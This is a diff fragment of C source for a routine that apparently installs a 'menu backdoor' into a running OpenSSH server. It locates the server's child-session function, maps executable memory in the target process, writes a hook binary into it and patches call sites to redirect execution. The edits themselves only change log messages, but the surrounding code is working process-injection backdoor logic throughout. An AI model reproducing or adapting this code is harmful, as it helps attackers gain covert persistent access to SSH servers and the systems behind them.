@@ -29,15 +29,12 @@ void backdoor_menu_install(inject_ctx *ctx) {
 
 	memcpy(evil_bin, hook_menu_bin, hook_menu_bin_len);
 
-	//u64 child_set_env = sub_by_debugstr(ctx, "child_set_env: too many env vars");
-	//info("child_set_env = 0x%llx", child_set_env);
+	mod_banner("installing menu backdoor");
 
 	u64 do_child = sub_by_debugstr(ctx, "This service allows sftp connections only.");
 	info("do_child = 0x%llx", do_child);
 
 	u64 hole_addr = 0; 
-
-	info2("entering critical phase");
 
 	import_table[0] = ctx->config_addr;
 	import_table[1] = do_child; 
@@ -50,7 +47,7 @@ void backdoor_menu_install(inject_ctx *ctx) {
 		if (entry->dest == do_child && entry->type == CALLCACHE_TYPE_CALL) {
 			if (hole_addr == 0) {
 				hole_addr = find_hole(ctx, entry->addr, 0x1000);
-				info("FIND HOLE %lx", hole_addr);
+				info("menu stub hole: %lx", hole_addr);
 
 				_mmap(
 					ctx, (void*)hole_addr, 0x1000,
@@ -60,7 +57,6 @@ void backdoor_menu_install(inject_ctx *ctx) {
 				);
 
 				_poke(ctx->pid, hole_addr, evil_bin, hook_menu_bin_len);
-				info("COPIED HOOK!");
 			}
 
 			diff = 0x100000000-(entry->addr-hole_addr)-5;
